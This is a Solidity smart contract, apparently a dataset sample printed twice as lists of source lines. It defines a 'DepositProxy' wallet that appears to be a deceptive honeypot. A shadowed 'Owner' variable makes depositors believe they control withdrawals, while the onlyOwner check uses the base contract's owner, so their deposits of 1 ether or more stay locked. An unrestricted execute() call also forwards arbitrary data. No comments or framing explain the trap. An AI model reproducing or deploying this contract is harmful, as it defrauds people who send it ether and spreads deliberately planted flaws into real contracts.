['pragma solidity ^0.4.20;\n', '\n', 'contract Proxy  {\n', '    address public Owner = msg.sender;\n', '    address public Proxy = 0x0;\n', '    bytes data;\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }\n', '    function proxy(address _proxy) onlyOwner { Proxy = _proxy; }\n', '    function () payable { data = msg.data; }\n', '    function execute() returns (bool) { return Proxy.call(data); }\n', '}\n', '\n', 'contract DepositProxy is Proxy {\n', '    address public Owner;\n', '    mapping (address => uint) public Deposits;\n', '\n', '    event Deposited(address who, uint amount);\n', '    event Withdrawn(address who, uint amount);\n', '    \n', '    function Deposit() payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '\n', '    function deposit() payable {\n', '        if (msg.value >= 1 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '            Deposited(msg.sender, msg.value);\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint amount) payable onlyOwner {\n', '        if (Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '            Withdrawn(msg.sender, amount);\n', '        }\n', '    }\n', '}']
['pragma solidity ^0.4.20;\n', '\n', 'contract Proxy  {\n', '    address public Owner = msg.sender;\n', '    address public Proxy = 0x0;\n', '    bytes data;\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }\n', '    function proxy(address _proxy) onlyOwner { Proxy = _proxy; }\n', '    function () payable { data = msg.data; }\n', '    function execute() returns (bool) { return Proxy.call(data); }\n', '}\n', '\n', 'contract DepositProxy is Proxy {\n', '    address public Owner;\n', '    mapping (address => uint) public Deposits;\n', '\n', '    event Deposited(address who, uint amount);\n', '    event Withdrawn(address who, uint amount);\n', '    \n', '    function Deposit() payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '\n', '    function deposit() payable {\n', '        if (msg.value >= 1 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '            Deposited(msg.sender, msg.value);\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint amount) payable onlyOwner {\n', '        if (Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '            Withdrawn(msg.sender, amount);\n', '        }\n', '    }\n', '}']
